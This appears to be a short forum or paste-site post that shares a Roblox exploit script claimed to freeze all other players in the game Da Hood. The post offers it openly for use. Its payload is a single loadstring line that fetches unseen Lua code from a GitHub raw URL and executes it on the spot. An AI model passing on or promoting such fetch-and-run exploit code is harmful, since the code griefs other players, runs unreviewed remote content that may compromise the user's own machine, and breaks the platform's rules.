copy the loadstring obviously
FE PLAYER FREEZER
A free script that freezes everyone in da hood.
-You need a boombox
-It wont freeze mobile players
If you have a boombox, just execute, and it freezes all players.
Script: 

loadstring(game:HttpGet("https://raw.githubusercontent.com/0nly6Ex/crypt/main/feplayerfreeze.lua"))()

if you dont have boombox, try to buy it, or u cant use it :(
